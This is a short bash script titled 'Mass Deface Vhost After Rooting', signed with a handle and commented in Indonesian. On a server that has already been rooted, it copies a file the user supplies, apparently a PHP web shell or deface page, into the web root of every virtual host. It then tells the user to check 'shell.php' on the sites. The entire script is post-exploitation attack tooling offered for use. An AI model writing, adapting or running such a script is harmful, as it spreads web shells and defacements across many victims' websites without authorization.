#!/bin/bash

echo "[Mass Deface Vhost After Rooting] [Vexelvox]"

# minta input nama file yang akan dicopy
echo -n "FileName ex ez.php: "
read file_to_copy

# path ke folder vhosts
vhosts_path="/var/www/vhosts/"

# list folder dalam vhosts
vhosts_folders=$(find "$vhosts_path" -maxdepth 1 -type d ! -name '.')

# loop melalui setiap folder dalam vhosts
for folder in $vhosts_folders
do
  # path ke httpdocs dalam folder vhosts saat ini
  httpdocs_path="${folder}/httpdocs/"

  # copy file ke httpdocs dalam folder vhosts saat ini
  cp "$file_to_copy" "${httpdocs_path}"
done

echo "Done, check site.com/shell.php manually"
